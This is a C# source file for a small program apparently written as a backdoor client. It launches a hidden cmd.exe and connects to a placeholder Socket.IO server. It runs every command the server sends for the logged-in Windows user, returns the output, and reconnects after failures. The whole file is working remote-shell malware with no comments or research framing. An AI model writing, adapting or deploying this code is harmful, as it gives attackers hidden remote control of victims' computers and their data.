using System;
using System.IO;
using System.Threading.Tasks;
using SocketIOClient;
using Newtonsoft.Json;
using System.Diagnostics;

namespace BDC
{
    class Program
    {
        public static SocketIO client;
        public static string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        public static Process cmd = new Process();
        public class ClientData
        {
            public string uid { get; set; }
            public string cmd { get; set; }
        }

        static void Main(string[] args)
        {
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.OutputDataReceived += new DataReceivedEventHandler(OutputHandler);
            cmd.Start();
            client = new SocketIO("http://<serverIpAddr>:80/");
            client.On("cmdExec", async response =>
            {
                string json = response.GetValue().ToString();
                dynamic jsonnode = JsonConvert.DeserializeObject(json);
                if (jsonnode["uid"] == userName)
                {
                    cmd.StandardInput.WriteLine(jsonnode["cmd"]);
                }
            });
            client.On("pingingAllClients", async response =>
            {
                clientEmit("Hello World!", 0);
            });
            connectSocket();
            Console.ReadLine();
        }

        static void OutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (!String.IsNullOrWhiteSpace(outLine.Data))
            {
                clientEmit(outLine.Data);
            }
        }

        static async void connectSocket()
        {
            await client.ConnectAsync();
            cmd.BeginOutputReadLine();
            client.OnConnected += async (sender, e) =>
            {
                clientEmit("Hello World!", 0);
            };
        }

        static async void clientEmit(string cmd, int normal = 1)
        {
            var ClientData = new ClientData
            {
                uid = userName,
                cmd = cmd
            };
            try
            {
                if (normal == 1)
                {
                    await client.EmitAsync("returnData", System.Text.Json.JsonSerializer.Serialize(ClientData));
                }
                else
                {
                    await client.EmitAsync("newClient", System.Text.Json.JsonSerializer.Serialize(ClientData));
                }
            }
            catch (Exception)
            {
                await Task.Delay(2000);
                Main(null);
            }
        }
    }
}
